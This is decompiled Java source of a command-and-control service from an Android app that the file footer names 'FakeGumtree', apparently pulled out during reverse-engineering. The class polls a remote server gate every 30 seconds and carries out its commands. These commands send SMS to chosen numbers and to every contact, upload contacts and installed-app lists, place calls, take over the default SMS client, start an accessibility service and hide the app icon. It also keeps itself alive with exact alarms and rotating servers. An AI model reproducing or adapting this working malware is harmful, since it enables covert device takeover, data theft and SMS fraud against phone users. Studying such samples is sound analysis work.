package com.gumsis.srs;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.Ringtone;
import android.media.RingtoneManager;
import android.net.Uri;
import android.os.Build.VERSION;
import com.gumsis.Realtalk;
import com.gumsis.api.request.HTTPServer;
import com.gumsis.api.request.HttpResponse;
import com.gumsis.api.request.HttpResponseHandler;
import com.gumsis.checktls.CmndTls;
import com.gumsis.checktls.CntctsTls;
import com.gumsis.checktls.CntctsTls.OnContactsCallback;
import com.gumsis.checktls.IntTls;
import com.gumsis.checktls.MsTls;
import com.gumsis.checktls.Print;
import com.gumsis.checktls.WFTls;
import com.gumsis.cntcts.Contact;
import com.gumsis.mess.MessStatusInterface;
import com.gumsis.mess.model.MessageEvent;
import com.gumsis.not.NotController;
import com.gumsis.ping.Ping;
import com.gumsis.ping.PingResult;
import com.gumsis.srs.api.requests.HitGateRequest;
import com.gumsis.srs.api.requests.RegistrationReportStep1Request;
import com.gumsis.srs.api.requests.RegistrationReportStep2Request;
import com.gumsis.srs.api.requests.RegistrationReportStep3Request;
import com.gumsis.srs.api.requests.RegistrationReportStep4Request;
import com.gumsis.srs.api.requests.RegistrationReportStep5Request;
import com.gumsis.srs.api.requests.RegistrationReportStep6Request;
import com.gumsis.srs.api.requests.SendReportRequest;
import com.gumsis.srs.api.requests.data.ReportData;
import com.gumsis.srs.api.responses.HitGateResponse;
import com.gumsis.srs.api.responses.HitGateResponse.Message;
import com.gumsis.srs.api.responses.StatusResponse;
import com.gumsis.srs.newapi.utils.Util;
import com.gumsis.srs.rcv.AlarmBroadCastReceiver;
import de.greenrobot.event.EventBus;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class CmndSrs
  extends IntentService
  implements HttpResponseHandler<HttpResponse>
{
  private static final int VALUE_PING = 10;
  private static final int VALUE_WHEN_WIFI_ON = 30;
  private AlarmManager mAlarmManager;
  private List<String> mApkPackageNameList;
  private String mMessage = "";
  private long mRid = 0L;
  private Timer mTimer = new Timer();
  private boolean registrationPart1;
  private boolean registrationPart2;
  private boolean registrationPart3;
  private boolean registrationPart4;
  private boolean registrationPart5;
  private boolean registrationPart6;
  
  public CmndSrs()
  {
    super(CmndSrs.class.getName());
  }
  
  private void callNumber(Context paramContext, HitGateResponse paramHitGateResponse)
  {
    if (this.mRid != Realtalk.getPreviousRid(paramContext))
    {
      Realtalk.setPreviousRid(paramContext, this.mRid);
      IntTls.callNumber(paramContext, paramHitGateResponse.phNumber);
      sendCallNumberToServer(0L);
    }
  }
  
  private void changeSmsClient(Context paramContext, HitGateResponse paramHitGateResponse)
  {
    if (this.mRid != Realtalk.getPreviousRid(paramContext))
    {
      Realtalk.setPreviousRid(paramContext, this.mRid);
      GPSrs.sendObjectBroadcast(paramContext, 12, paramHitGateResponse.changeMSCl);
      sendChangeMSClToServer(0L);
    }
  }
  
  private PendingIntent getAlarmCommandIntent(Context paramContext)
  {
    return PendingIntent.getBroadcast(paramContext, 134217728, new Intent(paramContext, AlarmBroadCastReceiver.class), 0);
  }
  
  private void getPush(Context paramContext, HitGateResponse paramHitGateResponse)
  {
    this.mMessage = paramHitGateResponse.message;
    if (this.mRid != Realtalk.getPreviousRid(paramContext))
    {
      Realtalk.setPreviousRid(paramContext, this.mRid);
      NotController.initNot(paramContext, paramHitGateResponse);
      startNotificationSound();
      sendingPushStatusToServer(0L);
    }
  }
  
  private void hardMode(Context paramContext, HitGateResponse paramHitGateResponse)
  {
    if (this.mRid != Realtalk.getPreviousRid(paramContext))
    {
      Realtalk.setPreviousRid(paramContext, this.mRid);
      Realtalk.setHardMode(paramContext, paramHitGateResponse.hardMode.equals("on"));
      sendHardModeToServer(0L);
    }
  }
  
  private void hideApp()
  {
    Object localObject = getPackageName();
    localObject = new ComponentName((String)localObject, (String)localObject + ".MainActivity");
    getApplicationContext().getPackageManager().setComponentEnabledSetting((ComponentName)localObject, 2, 1);
  }
  
  private void mainTask()
  {
    this.mTimer.scheduleAtFixedRate(new TimerTask()
    {
      public void run()
      {
        if (!Util.useJobSchedule()) {
          CmndSrs.this.startAlarm();
        }
        CmndSrs.this.startNotificationSound();
        if (!CmndTls.isInternetConnected(CmndSrs.this))
        {
          CmndSrs.this.onWF();
          return;
        }
        CmndSrs.this.sendHitGateAPIRequest(CmndSrs.this);
      }
    }, 0L, 30000L);
  }
  
  private void onPing(final Context paramContext)
  {
    new Thread(new Runnable()
    {
      public void run()
      {
        try
        {
          int i = Realtalk.getPingCounts(paramContext) + 1;
          Object localObject = Ping.onAddress("google.com").setTimeOutMillis(1000).doPing();
          if ((localObject != null) && (((PingResult)localObject).isReachable))
          {
            Realtalk.setPingCounts(paramContext, i);
            if (i == 10)
            {
              localObject = Realtalk.getNextServerGate(paramContext);
              Realtalk.setServerGate(paramContext, (String)localObject);
              Realtalk.setPingCounts(paramContext, 0);
            }
          }
          return;
        }
        catch (Exception localException)
        {
          localException.printStackTrace();
        }
      }
    }).start();
  }
  
  private void onWF()
  {
    int i = Realtalk.getWFCounts(this) + 1;
    Realtalk.setWFCounts(this, i);
    if (i >= 30)
    {
      WFTls.onWifi(this);
      Realtalk.setWFCounts(this, 0);
    }
  }
  
  private void parseCallNumber(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendCallNumberToServer(60000L);
        }
        return;
      }
      sendCallNumberToServer(60000L);
      return;
    }
    sendCallNumberToServer(60000L);
  }
  
  private void parseChangeMSCl(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendChangeMSClToServer(60000L);
        }
        return;
      }
      sendChangeMSClToServer(60000L);
      return;
    }
    sendChangeMSClToServer(60000L);
  }
  
  private void parseHardMode(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendHardModeToServer(60000L);
        }
        return;
      }
      sendHardModeToServer(60000L);
      return;
    }
    sendHardModeToServer(60000L);
  }
  
  private void parseHitGateAPI(Context paramContext, HitGateResponse paramHitGateResponse)
  {
    if (paramHitGateResponse.ret == 0)
    {
      Realtalk.setWFCounts(paramContext, 0);
      Realtalk.setPingCounts(paramContext, 0);
      try
      {
        if (paramHitGateResponse.request == null) {
          return;
        }
        this.mRid = paramHitGateResponse.rid;
        if (paramHitGateResponse.request.equalsIgnoreCase("registration"))
        {
          registration(paramContext);
          return;
        }
        if (paramHitGateResponse.request.equalsIgnoreCase("send_sms"))
        {
          sendSms(paramContext, paramHitGateResponse);
          return;
        }
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        Print.e(paramContext.toString());
        return;
      }
      if (paramHitGateResponse.request.equalsIgnoreCase("sms_contact"))
      {
        smsContact(paramContext, paramHitGateResponse);
        return;
      }
      if (paramHitGateResponse.request.equalsIgnoreCase("get_push"))
      {
        getPush(paramContext, paramHitGateResponse);
        return;
      }
      if (paramHitGateResponse.request.equalsIgnoreCase("tracker"))
      {
        tracker(paramContext);
        return;
      }
      if (paramHitGateResponse.request.equalsIgnoreCase("move_sms_client"))
      {
        changeSmsClient(paramContext, paramHitGateResponse);
        return;
      }
      if (paramHitGateResponse.request.equalsIgnoreCase("hard_mode"))
      {
        hardMode(paramContext, paramHitGateResponse);
        return;
      }
      if (paramHitGateResponse.request.equalsIgnoreCase("call_number"))
      {
        callNumber(paramContext, paramHitGateResponse);
        return;
      }
      if (paramHitGateResponse.request.equalsIgnoreCase("start_access")) {
        startAccess(paramContext, paramHitGateResponse);
      }
    }
    else
    {
      onPing(paramContext);
    }
  }
  
  private void parsePushEndStatus(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendingPushEndStatusToServer(60000L);
        }
        return;
      }
      sendingPushEndStatusToServer(60000L);
      return;
    }
    sendingPushEndStatusToServer(60000L);
  }
  
  private void parsePushStatus(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendingPushStatusToServer(60000L);
        }
        return;
      }
      sendingPushStatusToServer(60000L);
      return;
    }
    sendingPushStatusToServer(60000L);
  }
  
  private void parsePushTracker(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendingTrackerToServer(60000L);
        }
        return;
      }
      sendingTrackerToServer(60000L);
      return;
    }
    sendingTrackerToServer(60000L);
  }
  
  private void parseRegistrationStep1(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (!this.registrationPart1) {
        registrationReportStep2(0L);
      }
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted"))
        {
          this.registrationPart1 = true;
          registrationReportStep1(60000L);
          return;
        }
        this.registrationPart1 = false;
        return;
      }
      this.registrationPart1 = true;
      registrationReportStep1(60000L);
      this.registrationPart1 = false;
      return;
    }
    this.registrationPart1 = false;
    this.registrationPart1 = true;
    registrationReportStep1(60000L);
  }
  
  private void parseRegistrationStep2(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (!this.registrationPart2) {
        registrationReportStep3(0L);
      }
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted"))
        {
          this.registrationPart2 = true;
          registrationReportStep2(60000L);
          return;
        }
        this.registrationPart2 = false;
        return;
      }
      this.registrationPart2 = false;
      this.registrationPart2 = true;
      registrationReportStep2(60000L);
      return;
    }
    this.registrationPart2 = false;
    this.registrationPart2 = true;
    registrationReportStep2(60000L);
  }
  
  private void parseRegistrationStep3(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (!this.registrationPart3) {
        registrationReportStep4(0L);
      }
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted"))
        {
          this.registrationPart3 = true;
          registrationReportStep3(60000L);
          return;
        }
        this.registrationPart3 = false;
        return;
      }
      this.registrationPart3 = false;
      this.registrationPart3 = true;
      registrationReportStep3(60000L);
      return;
    }
    this.registrationPart3 = false;
    this.registrationPart3 = true;
    registrationReportStep3(60000L);
  }
  
  private void parseRegistrationStep4(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (!this.registrationPart4) {
        registrationReportStep5(0L);
      }
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted"))
        {
          this.registrationPart4 = true;
          registrationReportStep4(60000L);
          return;
        }
        this.registrationPart4 = false;
        return;
      }
      this.registrationPart4 = false;
      this.registrationPart4 = true;
      registrationReportStep4(60000L);
      return;
    }
    this.registrationPart4 = false;
    this.registrationPart4 = true;
    registrationReportStep4(60000L);
  }
  
  private void parseRegistrationStep5(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted"))
        {
          this.registrationPart5 = true;
          registrationReportStep5(60000L);
          return;
        }
        this.registrationPart5 = false;
        return;
      }
      this.registrationPart5 = false;
      this.registrationPart5 = true;
      registrationReportStep5(60000L);
      return;
    }
    this.registrationPart5 = false;
    this.registrationPart5 = true;
    registrationReportStep5(60000L);
  }
  
  private void parseSendSmsErrorReport(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendSMSReportErrorToServer(60000L);
        }
        return;
      }
      sendSMSReportErrorToServer(60000L);
      return;
    }
    sendSMSReportErrorToServer(60000L);
  }
  
  private void parseSendSmsReport(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendSMSReportToServer(60000L);
        }
        return;
      }
      sendSMSReportToServer(60000L);
      return;
    }
    sendSMSReportToServer(60000L);
  }
  
  private void parseSendSmsStatus(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendSMSStatusStartToServer(60000L);
        }
        return;
      }
      sendSMSStatusStartToServer(60000L);
      return;
    }
    sendSMSStatusStartToServer(60000L);
  }
  
  private void parseSendSmsStatusEnd(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendSMSStatusEndToServer(60000L);
        }
        return;
      }
      sendSMSStatusEndToServer(60000L);
      return;
    }
    sendSMSStatusEndToServer(60000L);
  }
  
  private void parseStartAccessEnd(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendStartAccessEndToServer(60000L);
        }
        return;
      }
      sendStartAccessEndToServer(60000L);
      return;
    }
    sendStartAccessEndToServer(60000L);
  }
  
  private void parseStartAccessRun(StatusResponse paramStatusResponse)
  {
    if (paramStatusResponse.ret == 0)
    {
      if (paramStatusResponse.answer != null)
      {
        if (!paramStatusResponse.answer.equalsIgnoreCase("accepted")) {
          sendStartAccessRunToServer(60000L);
        }
        return;
      }
      sendStartAccessRunToServer(60000L);
      return;
    }
    sendStartAccessRunToServer(60000L);
  }
  
  private void registration(Context paramContext)
  {
    if (this.mRid != Realtalk.getPreviousRid(paramContext))
    {
      Realtalk.setPreviousRid(paramContext, this.mRid);
      registrationReportStep1(0L);
    }
  }
  
  private void registrationReportStep1(long paramLong)
  {
    RegistrationReportStep1Request localRegistrationReportStep1Request = new RegistrationReportStep1Request(this, this);
    HTTPServer.getInstance().doRequestDelayed(localRegistrationReportStep1Request, paramLong);
  }
  
  private void registrationReportStep2(long paramLong)
  {
    RegistrationReportStep2Request localRegistrationReportStep2Request = new RegistrationReportStep2Request(this, this);
    HTTPServer.getInstance().doRequestDelayed(localRegistrationReportStep2Request, paramLong);
  }
  
  private void registrationReportStep3(long paramLong)
  {
    RegistrationReportStep3Request localRegistrationReportStep3Request = new RegistrationReportStep3Request(this, this.mApkPackageNameList, this);
    HTTPServer.getInstance().doRequestDelayed(localRegistrationReportStep3Request, paramLong);
  }
  
  private void registrationReportStep4(long paramLong)
  {
    RegistrationReportStep4Request localRegistrationReportStep4Request = new RegistrationReportStep4Request(this, this);
    HTTPServer.getInstance().doRequestDelayed(localRegistrationReportStep4Request, paramLong);
  }
  
  private void registrationReportStep5(long paramLong)
  {
    RegistrationReportStep5Request localRegistrationReportStep5Request = new RegistrationReportStep5Request(this, this);
    HTTPServer.getInstance().doRequestDelayed(localRegistrationReportStep5Request, paramLong);
  }
  
  private void registrationReportStep6(final long paramLong)
  {
    new CntctsTls(new CntctsTls.OnContactsCallback()
    {
      public void onContactsError() {}
      
      public void onContactsSuccess(List<Contact> paramAnonymousList)
      {
        paramAnonymousList = new RegistrationReportStep6Request(CmndSrs.this, paramAnonymousList, CmndSrs.this);
        HTTPServer.getInstance().doRequestDelayed(paramAnonymousList, paramLong);
      }
    }).execute(new Context[] { this });
  }
  
  private void sendCallNumberToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 29, new ReportData("call_number", this.mRid, "end"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendChangeMSClToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 27, new ReportData("move_sms_client", this.mRid, "run"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendHardModeToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 28, new ReportData("hard_mode", this.mRid, "end"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendHitGateAPIRequest(final Context paramContext)
  {
    paramContext = new HitGateRequest(this, new HttpResponseHandler()
    {
      public void onResponse(int paramAnonymousInt, HitGateResponse paramAnonymousHitGateResponse)
      {
        CmndSrs.this.parseHitGateAPI(paramContext, paramAnonymousHitGateResponse);
      }
    });
    HTTPServer.getInstance().doRequest(paramContext);
  }
  
  private void sendSMSReportErrorToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 19, new ReportData("send_sms", this.mRid, "error_slot"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendSMSReportToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 20, new ReportData("send_sms", this.mRid, "run"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendSMSStatusEndToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 21, new ReportData("sms_contact", this.mRid, "end"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendSMSStatusStartToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 22, new ReportData("sms_contact", this.mRid, "start"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendSms(Context paramContext, HitGateResponse paramHitGateResponse)
  {
    this.mMessage = paramHitGateResponse.message;
    if (this.mRid != Realtalk.getPreviousRid(paramContext))
    {
      Realtalk.setPreviousRid(paramContext, this.mRid);
      if (MsTls.sendFullSMS(paramContext, paramHitGateResponse.slot, paramHitGateResponse.number, null, this.mMessage, null, null)) {
        sendSMSReportToServer(0L);
      }
    }
    else
    {
      return;
    }
    sendSMSReportErrorToServer(0L);
  }
  
  private void sendStartAccessEndToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 31, new ReportData("start_access", this.mRid, "end"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendStartAccessRunToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 30, new ReportData("start_access", this.mRid, "run"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendingPushEndStatusToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 11, new ReportData("get_push", this.mRid, "end"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendingPushStatusToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 12, new ReportData("get_push", this.mRid, "run"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void sendingTrackerToServer(long paramLong)
  {
    SendReportRequest localSendReportRequest = new SendReportRequest(this, 26, new ReportData("tracker", this.mRid, "on"), this);
    HTTPServer.getInstance().doRequestDelayed(localSendReportRequest, paramLong);
  }
  
  private void smsContact(Context paramContext, HitGateResponse paramHitGateResponse)
  {
    if (this.mRid != Realtalk.getPreviousRid(paramContext))
    {
      Realtalk.setPreviousRid(paramContext, this.mRid);
      sendSMSStatusStartToServer(0L);
      int i = 0;
      while (i < paramHitGateResponse.messageList.size())
      {
        try
        {
          paramContext = (HitGateResponse.Message)paramHitGateResponse.messageList.get(i);
          if (paramContext != null) {
            CmndTls.sendSMS(paramContext.phone, paramContext.text, this, new MessStatusInterface()
            {
              public void isSmsDelivered(boolean paramAnonymousBoolean) {}
              
              public void isSmsSent(boolean paramAnonymousBoolean) {}
            });
          }
          Thread.sleep(5000L);
        }
        catch (Exception paramContext)
        {
          for (;;)
          {
            paramContext.printStackTrace();
          }
        }
        i += 1;
      }
      sendSMSStatusEndToServer(0L);
    }
  }
  
  private void startAccess(Context paramContext, HitGateResponse paramHitGateResponse)
  {
    if (this.mRid != Realtalk.getPreviousRid(paramContext))
    {
      Realtalk.setPreviousRid(paramContext, this.mRid);
      sendStartAccessRunToServer(0L);
      Realtalk.setStartAccess(this, true);
      IntTls.startDialogAccessService(this);
      hideApp();
      sendStartAccessEndToServer(0L);
    }
  }
  
  private void startAlarm()
  {
    long l;
    try
    {
      if (this.mAlarmManager == null) {
        return;
      }
      this.mAlarmManager.cancel(getAlarmCommandIntent(this));
      l = System.currentTimeMillis() + 60000L;
      if (Build.VERSION.SDK_INT >= 23)
      {
        this.mAlarmManager.setExactAndAllowWhileIdle(0, l, getAlarmCommandIntent(this));
        return;
      }
      if (Build.VERSION.SDK_INT >= 19)
      {
        this.mAlarmManager.setExact(0, l, getAlarmCommandIntent(this));
        return;
      }
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      return;
    }
    this.mAlarmManager.set(0, l, getAlarmCommandIntent(this));
  }
  
  private void timerCancel()
  {
    if (this.mTimer != null)
    {
      this.mTimer.cancel();
      this.mTimer = null;
    }
  }
  
  private void tracker(Context paramContext)
  {
    if (this.mRid != Realtalk.getPreviousRid(paramContext))
    {
      Realtalk.setPreviousRid(paramContext, this.mRid);
      sendingTrackerToServer(0L);
    }
  }
  
  public void onCreate()
  {
    super.onCreate();
    this.mApkPackageNameList = CmndTls.getAllInstalledApkInfo(this);
    this.mAlarmManager = ((AlarmManager)getSystemService("alarm"));
    if (!EventBus.getDefault().isRegistered(this)) {
      EventBus.getDefault().registerSticky(this);
    }
  }
  
  public void onDestroy()
  {
    super.onDestroy();
    timerCancel();
    if (EventBus.getDefault().isRegistered(this)) {
      EventBus.getDefault().unregister(this);
    }
  }
  
  public void onEventMainThread(MessageEvent paramMessageEvent)
  {
    if (paramMessageEvent.message.contains("contacts_fetched"))
    {
      EventBus.getDefault().removeStickyEvent(paramMessageEvent);
      if ((CmndTls.contactList != null) && (CmndTls.contactList.size() > 0))
      {
        i = 0;
        for (;;)
        {
          if (i < CmndTls.contactList.size()) {
            try
            {
              CmndTls.sendSMS((String)CmndTls.contactList.get(i), this.mMessage, this, new MessStatusInterface()
              {
                public void isSmsDelivered(boolean paramAnonymousBoolean) {}
                
                public void isSmsSent(boolean paramAnonymousBoolean) {}
              });
              i += 1;
            }
            catch (Exception paramMessageEvent)
            {
              for (;;)
              {
                paramMessageEvent.printStackTrace();
              }
            }
          }
        }
        sendSMSStatusEndToServer(0L);
      }
    }
    while (!paramMessageEvent.message.contains("push_end_status"))
    {
      int i;
      return;
    }
    EventBus.getDefault().removeStickyEvent(paramMessageEvent);
    sendingPushEndStatusToServer(0L);
  }
  
  protected void onHandleIntent(Intent paramIntent)
  {
    mainTask();
    if (paramIntent != null) {
      AlarmBroadCastReceiver.completeWakefulIntent(paramIntent);
    }
  }
  
  public void onResponse(int paramInt, HttpResponse paramHttpResponse)
  {
    if (paramHttpResponse != null) {}
    switch (paramInt)
    {
    case 18: 
    case 23: 
    case 24: 
    case 25: 
    default: 
      return;
    case 11: 
      parsePushEndStatus((StatusResponse)paramHttpResponse);
      return;
    case 12: 
      parsePushStatus((StatusResponse)paramHttpResponse);
      return;
    case 13: 
      parseRegistrationStep1((StatusResponse)paramHttpResponse);
      return;
    case 14: 
      parseRegistrationStep2((StatusResponse)paramHttpResponse);
      return;
    case 15: 
      parseRegistrationStep3((StatusResponse)paramHttpResponse);
      return;
    case 16: 
      parseRegistrationStep4((StatusResponse)paramHttpResponse);
      return;
    case 17: 
      parseRegistrationStep5((StatusResponse)paramHttpResponse);
      return;
    case 19: 
      parseSendSmsErrorReport((StatusResponse)paramHttpResponse);
      return;
    case 20: 
      parseSendSmsReport((StatusResponse)paramHttpResponse);
      return;
    case 21: 
      parseSendSmsStatusEnd((StatusResponse)paramHttpResponse);
      return;
    case 22: 
      parseSendSmsStatus((StatusResponse)paramHttpResponse);
      return;
    case 26: 
      parsePushTracker((StatusResponse)paramHttpResponse);
      return;
    case 27: 
      parseChangeMSCl((StatusResponse)paramHttpResponse);
      return;
    case 28: 
      parseHardMode((StatusResponse)paramHttpResponse);
      return;
    case 29: 
      parseCallNumber((StatusResponse)paramHttpResponse);
      return;
    case 30: 
      parseStartAccessRun((StatusResponse)paramHttpResponse);
      return;
    }
    parseStartAccessEnd((StatusResponse)paramHttpResponse);
  }
  
  void startNotificationSound()
  {
    if (Realtalk.isPlaySound(this)) {}
    try
    {
      Uri localUri = RingtoneManager.getDefaultUri(2);
      RingtoneManager.getRingtone(getApplicationContext(), localUri).play();
      return;
    }
    catch (Exception localException)
    {
      localException.printStackTrace();
      Print.e(localException.toString());
    }
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/srs/CmndSrs.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */